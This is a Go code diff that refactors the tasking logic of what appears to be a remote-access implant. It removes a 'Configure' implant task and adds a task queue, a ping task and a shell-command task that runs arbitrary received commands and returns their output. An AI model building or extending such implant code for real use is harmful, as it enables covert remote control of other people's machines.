@@ -5,80 +5,91 @@ import (
 	"os/exec"
 )
 
+type Result struct {
+	Content string `json:"content"`
+	Success bool   `json:"success"`
+	TaskID  uint   `json:"task_id"`
+}
+
 type Tasker interface {
-	// TODO: idk why I need this
-	SetStatus(completed bool) // TODO: is idiomatic? rename?
-	Execute() (*Result, error)
+	Execute() Result
+	GetID() uint
 }
 
-type Configure struct {
-	Dwell     int
-	Running   bool
-	completed bool
-	Implant   *Implant
+type TaskQueue struct {
+	tasks []Tasker
 }
 
-func NewConfigureTask(dwell int, running bool, implant *Implant) *Configure {
-	return &Configure{
-		Dwell:   dwell,
-		Running: running,
-		Implant: implant,
+func NewTaskQueue() *TaskQueue {
+	return &TaskQueue{tasks: make([]Tasker, 0)}
+}
+
+func (q *TaskQueue) Enqueue(t Tasker) {
+	q.tasks = append(q.tasks, t)
+}
+
+// Dequeue returns the front Tasker and removes it from the queue
+func (q *TaskQueue) Dequeue() Tasker {
+	if len(q.tasks) == 0 {
+		return nil
 	}
+	task := q.tasks[0]
+	q.tasks = q.tasks[1:]
+	return task
+}
+func (q *TaskQueue) IsEmpty() bool {
+	return len(q.tasks) == 0
 }
 
-func (c *Configure) SetStatus(completed bool) {}
-func (c *Configure) Execute() (*Result, error) {
-
-	// TODO: essential these implant is pointer, test
-	c.Implant.dwellTime = c.Dwell
-	c.Implant.running = c.Running
-	// set kill switch here too ?
-
-	return &Result{
-		Content: "Successfully Set",
-		Success: true,
-	}, nil
+type TaskMetadata struct {
+	ID uint `json:"id"`
 }
 
 type Ping struct {
-	completed bool
-	result    string
+	TaskMetadata
 }
 
-func NewPingTask() *Ping {
-	return &Ping{}
-}
-
-func (p *Ping) SetStatus(completed bool) {}
-func (p *Ping) Execute() (*Result, error) {
-	return &Result{
-		Content: "PONG",
-		Success: true,
-	}, nil
-}
-
-// TODO: find better name ?
-type Command struct {
-	commandWithArgs []string
-}
-
-func NewCommandTask(commandWithArgs []string) *Command {
-	return &Command{
-		commandWithArgs: commandWithArgs,
+func NewPingTask(ID uint) *Ping {
+	return &Ping{
+		TaskMetadata{
+			ID: ID,
+		},
 	}
 }
 
-func (c *Command) SetStatus(completed bool) {
+func (p *Ping) Execute() Result {
+	return Result{Content: "pong", Success: true}
 }
 
-func (c *Command) Execute() (*Result, error) {
+func (p *Ping) GetID() uint {
+	return p.ID
+}
+
+type ShellCommand struct {
+	TaskMetadata
+	commandWithArgs []string
+}
+
+func NewShellCommandTask(ID uint, commandWithArgs []string) *ShellCommand {
+	return &ShellCommand{
+		TaskMetadata: TaskMetadata{
+			ID: ID,
+		},
+		commandWithArgs: commandWithArgs,
+	}
+}
+func (s *ShellCommand) GetID() uint {
+	return s.ID
+}
+
+func (s *ShellCommand) Execute() Result {
 
 	// TODO: fix this logic, have it send cmd + args separately
-	cmd := exec.Command(c.commandWithArgs[0], c.commandWithArgs[1:]...)
+	cmd := exec.Command(s.commandWithArgs[0], s.commandWithArgs[1:]...)
 
 	output, err := cmd.CombinedOutput() //  CombinedOutput runs the command and returns its combined standard output and standard error.
 
-	var result *Result
+	var result Result
 
 	// better way to do this?
 	if err != nil {
@@ -90,8 +101,5 @@ func (c *Command) Execute() (*Result, error) {
 		result.Content = string(output)
 	}
 
-	return result, nil
+	return result
 }
-
-// TODO: implement?
-type ListThreads struct{}
